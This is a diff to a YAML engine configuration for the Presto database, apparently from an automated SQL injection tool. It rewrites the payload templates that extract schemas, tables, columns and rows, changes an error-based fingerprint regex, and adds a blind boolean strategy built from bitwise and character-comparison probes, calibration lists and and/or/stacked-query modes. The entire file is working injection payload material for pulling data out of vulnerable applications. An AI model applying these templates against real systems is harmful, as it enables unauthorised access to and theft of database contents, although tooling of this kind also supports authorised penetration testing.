@@ -11,17 +11,20 @@ resource:
 
  schema:
   database: |
-   select array_join(
-       array_agg(
-           '${enclose_value_sql}'
-           || r
-           || '${separator_qte_sql}'
-           || q
-           || '${enclose_value_sql}'
-           || ''
+   select coalesce(array_join(
+       /* enforce values order, required for Blind */
+       array_sort(
+           array_agg(
+               '${enclose_value_sql}'
+               || r
+               || '${separator_qte_sql}'
+               || q
+               || '${enclose_value_sql}'
+               || ''
+           )
        ),
        '${separator_cell_sql}'
-   )
+   ), '')
    || '${trail_sql}' 
    from (
        SELECT table_schema r, '0' q FROM (
@@ -34,16 +37,19 @@ resource:
    ) x
 
   table: |
-   select array_join(
-       array_agg(
-           '${enclose_value_sql}'
-           || r
-           || '${separator_qte_sql}'
-           || q
-           || '${enclose_value_sql}'
-           || ''
-       ),'${separator_cell_sql}'
-   )
+   select coalesce(array_join(
+       array_sort(
+           array_agg(
+               '${enclose_value_sql}'
+               || r
+               || '${separator_qte_sql}'
+               || q
+               || '${enclose_value_sql}'
+               || ''
+           )
+       ),
+       '${separator_cell_sql}'
+   ), '')
    || '${trail_sql}' 
    from (
        SELECT table_name r, '0' q FROM (
@@ -57,17 +63,19 @@ resource:
    ) x   
 
   column: |
-   select array_join(
-       array_agg(
-           '${enclose_value_sql}'
-           || r
-           || '${separator_qte_sql}'
-           || q
-           || '${enclose_value_sql}'
-           || ''
+   select coalesce(array_join(
+       array_sort(
+           array_agg(
+               '${enclose_value_sql}'
+               || r
+               || '${separator_qte_sql}'
+               || q
+               || '${enclose_value_sql}'
+               || ''
+           )
        ),
        '${separator_cell_sql}'
-   ) 
+   ), '')
    || '${trail_sql}' 
    from (
        SELECT column_name r, '0' q FROM (
@@ -83,17 +91,19 @@ resource:
 
   row:
    query: |
-    select array_join(
-        array_agg(
-            '${enclose_value_sql}'
-            || r
-            || '${separator_qte_sql}'
-            || q
-            || '${enclose_value_sql}'
-            || ''
+    select coalesce(array_join(
+        array_sort(
+            array_agg(
+                '${enclose_value_sql}'
+                || r
+                || '${separator_qte_sql}'
+                || q
+                || '${enclose_value_sql}'
+                || ''
+            )
         ),
         '${separator_cell_sql}'
-    ) 
+    ), '')
     || '${trail_sql}' 
     from (
         select r, cast(count(*) as varchar) q from (
@@ -130,9 +140,8 @@ strategy:
    errorMessage:
     - presto
    orderByErrorMessage:
-#    Collision with postgres
-#    - ORDER BY position 1337 is not in select list
-    - Collision postgres ORDER BY position 1337 is not in select list
+    - Query failed.*ORDER BY position 1337 is not in select list.*DB Errorcode
+   engineSpecific: case when ${test} then codepoint('a')else 0 end=codepoint('a')
 
  union:
   indices: union select ${indices}
@@ -144,3 +153,45 @@ strategy:
            || ${calibrator}
    )
   orderBy: order by 1337
+
+ binary:
+  test:
+   bit: |
+    0 != bitwise_and(
+        codepoint(
+            cast(
+                substring(
+                    ${injection},
+                    ${window.char},
+                    1
+                )
+                as varchar(1)
+            )
+        ),
+        ${bit}
+    )
+   bin: |
+    substring(
+        ${injection},
+        ${window.char},
+        1
+    )
+    %3E%3Dchr(${mid.int})
+   truthyBin:
+    - chr(97)%3E%3Dchr(97)
+    - chr(97)%3E%3Dchr(65)
+    - chr(97)%3E%3Dchr(48)
+    - chr(98)%3E%3Dchr(97)
+    - chr(98)%3E%3Dchr(66)
+    - chr(49)%3E%3Dchr(48)
+   falsyBin:
+    - chr(97)%3E%3Dchr(98)
+    - chr(65)%3E%3Dchr(97)
+    - chr(66)%3E%3Dchr(98)
+    - chr(66)%3E%3Dchr(97)
+    - chr(48)%3E%3Dchr(65)
+    - chr(48)%3E%3Dchr(49)
+  modeAnd: and
+  modeOr: or
+  modeStack: ; select 1 where
+  blind: ${binary.mode} ${test}
